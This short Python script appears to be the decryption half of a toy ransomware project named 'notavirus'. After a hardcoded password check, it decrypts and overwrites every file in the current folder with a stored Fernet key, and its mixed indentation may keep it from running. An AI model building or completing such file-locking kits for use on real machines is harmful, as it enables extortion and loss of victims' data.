import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "notavirus.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secret_passwd = "T90_Army"
user_say = input("what is the password \n")

if user_say == secret_passwd:
	for file in files:
        	with open(file, "rb") as thefile:
                	contents = thefile.read()
        	contents_decrypted = Fernet(secretkey).decrypt(contents)
        	with open(file, "wb") as thefile:
                	thefile.write(contents_decrypted)
